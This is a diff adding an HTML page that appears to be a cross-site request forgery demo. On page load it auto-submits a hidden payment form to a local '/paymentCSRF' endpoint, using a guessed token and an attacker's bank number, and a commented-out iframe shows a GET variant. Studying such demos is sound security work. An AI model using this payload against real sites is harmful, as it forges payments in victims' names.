@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body onload="document.forms[0].submit()">
+
+
+    <!-- post -->
+    
+    <!-- csrf example -->
+
+    <form action="http://localhost:3000/paymentCSRF" method="post">
+    <input name="csrfToken" value="csrf_guess" hidden>
+    <input name="bankNumber" value="evil_bank_number">
+    <input name="amount" value="999">
+    <button>pay</button>
+    </form>
+
+
+ <!-- get -->
+ <!-- <iframe src=http://localhost:3001/user/a/b"></iframe> -->
+
+</body>
+</html>
